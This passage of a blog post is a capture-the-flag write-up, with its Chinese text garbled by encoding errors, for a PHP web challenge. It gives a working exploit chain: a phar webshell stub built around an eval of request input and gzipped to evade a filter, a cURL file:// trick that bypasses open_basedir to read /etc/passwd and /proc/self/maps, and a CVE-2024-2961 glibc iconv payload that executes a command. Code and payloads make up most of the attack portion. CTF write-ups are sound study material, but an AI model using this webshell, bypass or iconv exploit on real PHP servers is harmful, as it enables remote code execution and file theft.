</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;/tmp/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($_GET[<span style="color:#e6db74">&#39;down&#39;</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ä¸Šä¼ æ–‡ä»¶
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $target_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/&#34;</span>;
</span></span><span style="display:flex;"><span>    $target_file <span style="color:#f92672">=</span> $target_dir <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
</span></span><span style="display:flex;"><span>    $orig <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>];
</span></span><span style="display:flex;"><span>    $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>(<span style="color:#e6db74">&#39;file://&#39;</span><span style="color:#f92672">.</span> $orig);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// I hide a trick to bypass open_basedir, I&#39;m sure you can find it.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_close</span>($ch);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($data, <span style="color:#e6db74">&#39;&lt;?&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">stripos</span>($data, <span style="color:#e6db74">&#39;php&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">stripos</span>($data, <span style="color:#e6db74">&#39;halt&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>($target_file, $data);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;å­˜åœ¨ `&lt;?` æˆ–è€… `php` æˆ–è€… `halt` æ¶æ„å­—ç¬¦!&#34;</span>;
</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>å°†pharæ‰“åŒ…ä¸ºgzç»•è¿‡æ¶æ„å­—ç¬¦æ£€æµ‹ï¼Œå®ç°ä¸Šä¼ é©¬ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;exploit.phar&#39;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$stub <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;&lt;&#39;</span><span style="color:#e6db74">STUB</span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    @eval($_REQUEST[1]);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __HALT_COMPILER();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">STUB</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>($stub);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>, <span style="color:#e6db74">&#39;test&#39;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>æµ‹è¯•payloadï¼š<code>http://gz.imxbt.cn:20647/?down=exploit.phar.gz&amp;1=phpinfo();</code></p>
<p>disable_functionsç¦ç”¨äº†å¤§éƒ¨åˆ†å‡½æ•°</p>
<p>æœ¬é¢˜php.iniä¸­è®¾ç½®äº†<code>open_basedir = /var/www/html:/tmp</code>ï¼Œä½†curl_initä»ç„¶ä½¿ç”¨äº†fileåè®®ï¼š</p>
<pre tabindex="0"><code>Note:
The file protocol is disabled by cURL if open_basedir is set.
</code></pre><p>æ ¹æ®è¿™ä¸ªissueï¼šhttps://github.com/php/php-src/issues/16802 å¯ä»¥çŸ¥é“bypass open_basedirçš„æ–¹æ³•ï¼š</p>
<pre tabindex="0"><code>$ch = curl_init(&#34;file:///etc/passwd&#34;);curl_setopt($ch, CURLOPT_PROTOCOLS_STR, &#34;all&#34;);curl_exec($ch);
</code></pre><p>å®ç°ä»»æ„æ–‡ä»¶è¯»å–payloadï¼š</p>
<pre tabindex="0"><code>http://gz.imxbt.cn:20647/?down=exploit.phar.gz&amp;1=$ch%20=%20curl_init(%22file:///etc/passwd%22);curl_setopt($ch,%20CURLOPT_PROTOCOLS_STR,%20%22all%22);curl_exec($ch);
</code></pre><p>å°è¯•æ‰“CVE-2024-2961ï¼Œå¤§è‡´åŸç†æ˜¯glibcä¸­<code>iconv()</code>å‡½æ•°å°†ä¸€äº›æ•°æ®è½¬æ¢æˆISO-2022-CN-EXTæ ¼å¼æ—¶ï¼Œä¼šæœ‰1-3å­—èŠ‚çš„æº¢å‡ºï¼Œåˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<pre tabindex="0"><code>1.è·å– /proc/self/maps
2.è·å–libc
3.ç”Ÿæˆpayload
</code></pre><p>å…ˆè·å–<code>/proc/self/maps</code>æ–‡ä»¶ï¼š</p>
<pre tabindex="0"><code>http://gz.imxbt.cn:20647/?down=exploit.phar.gz&amp;1=$ch%20=%20curl_init(%22file:///proc/self/maps%22);curl_setopt($ch,%20CURLOPT_PROTOCOLS_STR,%20%22all%22);curl_exec($ch)
</code></pre><p>ä»dockerä¸­è·å–libc.so.6æ–‡ä»¶ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -name <span style="color:#e6db74">&#34;libc.so.6&#34;</span>
</span></span><span style="display:flex;"><span>docker cp pjimc:/usr/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
</span></span></code></pre></div><p>åˆ©ç”¨kezibeiçš„è„šæœ¬ï¼Œè®¾ç½®å¥½è¦æ‰§è¡Œçš„å‘½ä»¤<code>/readflag &gt; /tmp/flag</code>ç”Ÿæˆpayloadï¼š</p>
<pre tabindex="0"><code>php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXcdJjExG2hLX3M58c8bzCrZ8wI%2b6wYIxCPLPYmh3q3x/cbGLdMGvVsi7N2viV/9JLr3ROXX7q2lYmBrzAoDX15mOt7auvGK7efiNLt7j7SQN%2bDQw%2bSZHfdpx6q1V65pXutqjTd5QsFQjomBwxzXZd0W4v2c1V3WuvGW334OMgYMXTfVt2eO0Faog6r35g/uOw/3t%2bfPjoe/vVpq271va/3Ziz/vv/V81qkq%2bn7jvPLzXxjw0BB3yo/76mcJq7dOqZa2K3V%2be9zq623b41tz%2b1em/%2b1nmPZ%2b/a%2bvtb1L%2bf34v//t5/3f2TLjNeww6I7/xfYtvw59/lrwyffvcnf0vufVt6f978bc8fy6zfdfdVWfy239ufH/18%2b%2b3Psr2/Xs65t%2b/2u/zrR3fZvrK8tj039n9MTfX9uO2va6e93Zl3/vnX/sq/u%2b59/hyf/Wnp%2b3X8Vf9vz/o4ofiwwb4Ul0%2bf2QjEXW9qZuHUqqlWaVvdZt58v/%2bv1MmPBEIiweLbiQjjKvvFrjNdVP6yjyoeVTyqmM6KZ9wLyj6z5W7qm2%2b5U1S9VI4TyrJV3msNL5dN33h7e%2bA0jYky%2bEsnhoaXuluP%2bdyOPZZ33y1ykUsRDwHjl229Iha%2b8qPp3W/K%2bean2n/s%2b/PpZ/t8706O44wE3BXlnVs4VSr%2bcq591hR%2bMcE%2bAg47sGXarUdapvuW3a67oiGvo/SPAQA=
</code></pre><p>åˆ©ç”¨<code>file_put_contents</code>æ¥å®ç°æ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre tabindex="0"><code>http://gz.imxbt.cn:20647/?down=exploit.phar.gz&amp;1=file_put_contents(&#34;php://filter/write=convert.base64-decode|zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=test.php&#34;,&#34;e3vXcdJjExG2hLX3M58c8bzCrZ8wI%2b6wYIxCPLPYmh3q3x/cbGLdMGvVsi7N2viV/9JLr3ROXX7q2lYmBrzAoDX15mOt7auvGK7efiNLt7j7SQN%2bDQw%2bSZHfdpx6q1V65pXutqjTd5QsFQjomBwxzXZd0W4v2c1V3WuvGW334OMgYMXTfVt2eO0Faog6r35g/uOw/3t%2bfPjoe/vVpq271va/3Ziz/vv/V81qkq%2bn7jvPLzXxjw0BB3yo/76mcJq7dOqZa2K3V%2be9zq623b41tz%2b1em/%2b1nmPZ%2b/a%2bvtb1L%2bf34v//t5/3f2TLjNeww6I7/xfYtvw59/lrwyffvcnf0vufVt6f978bc8fy6zfdfdVWfy239ufH/18%2b%2b3Psr2/Xs65t%2b/2u/zrR3fZvrK8tj039n9MTfX9uO2va6e93Zl3/vnX/sq/u%2b59/hyf/Wnp%2b3X8Vf9vz/o4ofiwwb4Ul0%2bf2QjEXW9qZuHUqqlWaVvdZt58v/%2bv1MmPBEIiweLbiQjjKvvFrjNdVP6yjyoeVTyqmM6KZ9wLyj6z5W7qm2%2b5U1S9VI4TyrJV3msNL5dN33h7e%2bA0jYky%2bEsnhoaXuluP%2bdyOPZZ33y1ykUsRDwHjl229Iha%2b8qPp3W/K%2bean2n/s%2b/PpZ/t8706O44wE3BXlnVs4VSr%2bcq591hR%2bMcE%2bAg47sGXarUdapvuW3a67oiGvo/SPAQA=&#34;);
</code></pre><p>è¯»å–flagï¼š<code>http://gz.imxbt.cn:20647/?down=flag</code></p>
<p>LILCTF{ada29630-db49-4f0d-8f11-097b10c488c3}</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://github.com/ambionics/cnext-exploits/">https://github.com/ambionics/cnext-exploits/</a></p>
<p><a href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
